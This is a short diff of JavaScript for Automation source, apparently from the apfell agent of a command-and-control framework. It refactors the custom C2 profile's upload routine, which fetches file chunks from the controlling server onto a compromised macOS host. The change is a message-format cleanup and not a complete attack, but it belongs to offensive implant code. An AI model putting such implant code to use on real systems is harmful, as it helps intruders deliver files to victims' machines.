@@ -524,14 +524,14 @@ class customC2 extends baseC2{
     }
     upload(task, file_id, full_path){
         try{
-            let data = {"action": "post_response", "responses":[
-                    {"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path}, "task_id": task.id},
-                ]};
+            let data = {
+                "upload": { "file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path }
+            };
             let chunk_num = 1;
             let total_chunks = 1;
             let total_data = $.NSMutableData.dataWithLength(0);
             do{
-                let file_data = this.htmlPostData(data, apfell.id);
+                let file_data = this.postResponse(task, data);
                 if(file_data["responses"][0]['chunk_num'] === 0){
                     return "error from server";
                 }
